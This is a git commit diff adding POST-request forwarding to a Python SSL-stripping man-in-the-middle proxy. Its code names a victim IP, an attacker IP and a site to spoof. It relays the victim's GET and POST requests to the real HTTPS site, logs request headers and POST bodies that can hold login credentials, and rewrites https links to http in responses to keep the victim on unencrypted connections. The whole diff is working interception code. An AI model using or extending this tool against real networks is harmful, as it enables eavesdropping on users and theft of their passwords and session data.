9c2dec7fca5e4cddf1d6ffc6f097a4a7969dc074
Ruud14 <ruudbrouwers@hotmail.com>
2024-06-11 19:26:40 +0200

    Added forwarding of POST requests

--- forwarder.py
+++ forwarder.py
@@ -8,6 +8,8 @@ site_to_spoof = None
 ip_victim = None
 ip_attacker = None
 
+# TODO: Forward (non encryption related) headers from server to victim.
+
 # Custom HTTP request handler that only allows requests from the victim.
 class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
 
@@ -22,34 +24,68 @@ class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
         
         # Check if the client's IP address matches the allowed IP
         if client_ip == ip_victim:
-            # Print request path and headers
-            print("Received GET request")
+            log_info("Received GET request")
 
             # Remove the Upgrade-Insecure-Requests header
             new_headers = {key: value for key, value in self.headers.items()}
             new_headers.pop("Upgrade-Insecure-Requests", None)
 
-            print("Path:", self.path)
-            print("Headers:", new_headers)
-            print("FULL URL: ", "https://" + site_to_spoof + self.path)
+            log_info("Request Path: " + str(self.path))
+            log_info("Request Headers: "+ str(new_headers))
+            log_info("Request Full: "+ "https://" + site_to_spoof + self.path)
 
             response = self.s.get("https://" + site_to_spoof + self.path, headers=new_headers)
 
             # Replace all "https://" with "http://"
             try:
                 response_content = response.content.decode('utf-8').replace("https://", "http://").encode('utf-8')
-                print(response.content.decode('utf-8'))
             except UnicodeDecodeError:
                 response_content = response.content.replace(b"https://", b"http://")
 
             # Send the response back to the client
             self.send_response(response.status_code)
-            # copy headers from the response
-            # for header, value in response.headers.items():
-            #     # Replace https with http in the headers.
-            #     value = value.replace("https://", "http://")
-            #     self.send_header(header, value)
-            #     print("Key:", header, "Value:", value)
+
+            self.end_headers()
+            self.wfile.write(response_content)
+        else:
+            # Send a 403 Forbidden response
+            self.send_response(403)
+            self.end_headers()
+            self.wfile.write(b'403 Forbidden: Access denied')
+
+    def do_POST(self):
+
+        # Get the client's IP address
+        client_ip = self.client_address[0]
+        
+        # Check if the client's IP address matches the allowed IP
+        if client_ip == ip_victim:
+            log_info("Received POST request")
+
+            # Remove the Upgrade-Insecure-Requests header
+            new_headers = {key: value for key, value in self.headers.items()}
+            new_headers.pop("Upgrade-Insecure-Requests", None)
+
+            # Get the content length of the POST request
+            content_length = int(self.headers['Content-Length'])
+
+            # Read the POST data
+            post_data = self.rfile.read(content_length)
+
+            log_info("Request Path: "+ self.path)
+            log_info("Request Headers: " + str(new_headers))
+            log_info("Post data: "+ str(post_data))
+
+            response = self.s.post("https://" + site_to_spoof + self.path, headers=new_headers, data=post_data)
+
+            # Replace all "https://" with "http://"
+            try:
+                response_content = response.content.decode('utf-8').replace("https://", "http://").encode('utf-8')
+            except UnicodeDecodeError:
+                response_content = response.content.replace(b"https://", b"http://")
+
+            # Send the response back to the client
+            self.send_response(response.status_code)
 
             self.end_headers()
             self.wfile.write(response_content)
